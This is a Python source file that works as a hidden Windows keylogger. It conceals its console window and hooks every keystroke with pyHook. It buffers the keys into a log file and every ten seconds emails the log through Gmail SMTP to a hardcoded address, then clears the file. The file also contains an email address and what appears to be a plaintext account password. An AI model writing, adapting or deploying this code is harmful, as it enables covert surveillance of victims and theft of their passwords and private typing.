import pyHook,pythoncom,sys,logging
import time,datetime
import win32console
import win32gui
import os

window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window,0)
root_dir = os.path.split(os.path.realpath(__file__))[0]
log_file=os.path.join("C:\\Users\\Solid\\Desktop\\key","log_file.txt")

buffer=""
pause_period=2
last_press=datetime.datetime.now()
pause_delta=datetime.timedelta(seconds=pause_period)


wait_seconds = 10
#last_press=time.datetime.now()
timeout = time.time() + wait_seconds
def TimeOut():
    global timeout
    if time.time() > timeout:
        return True
    else:
        return False

def SendEmail(user,pwd,recipent,subject,body):
    import smtplib

    gmail_user = user
    gmail_pass = pwd
    FROM = user
    TO = recipent if type(recipent) is list else [recipent]
    SUBJECT =subject
    TEXT = body
    message = """\From: %s\nTo: %s\nSubject: %s\n\n%s
    """ % (FROM,", ".join(TO),SUBJECT,TEXT)
    try:
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.ehlo()
        server.starttls()
        server.login(gmail_user,gmail_pass)
        server.sendmail(FROM,TO,message)
        server.close()
        print("Mail,ok")
    except:
        print("Mail,Wrong")
def FormatAndSendEmail():
    with open(log_file,'r+') as f:
        actualdate = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read()
        data = 'Log Capturado a las :'+ actualdate+ "\n" +"\n"+data+"\n\n"
        SendEmail('anflo.97@gmail.com','970813leo','anflo.97@gmail.com',
                  'Nuevo Log',data)
        f.seek(0)
        f.truncate()



def log(message):
    if len(message)>0:
        with open(log_file,"a") as f:
            f.write("{}: \t{}\n".format(datetime.datetime.now(),message))
            print("{}: \t{}\n".format(datetime.datetime.now(),message))

def keypress(event):
    
    global buffer,last_press,timeout
    if event.Ascii:
        char = chr(event.Ascii)
        if char =="~":
            
            print("--PROGRAM ENDED--")
            log("--PROGRAM ENDED--")
            exit()
        if event.Ascii==13:
            buffer+="<ENTER>"
        elif event.Ascii==8:
            buffer+="<BACKSPACE>"
        elif event.Ascii==9:
            buffer+="<TAB>"
        else:
            buffer+=char
        #log(buffer)
        last_press = datetime.datetime.now()
    if TimeOut():
        log(buffer)
        timeout = time.time() + wait_seconds
        FormatAndSendEmail()
        buffer=""
        
        
    return True


print("PROGRAM STARTED")
log("PROGRAM STARTED")
hm = pyHook.HookManager()
hm.KeyDown=keypress
hm.HookKeyboard()
pythoncom.PumpMessages()
        
    
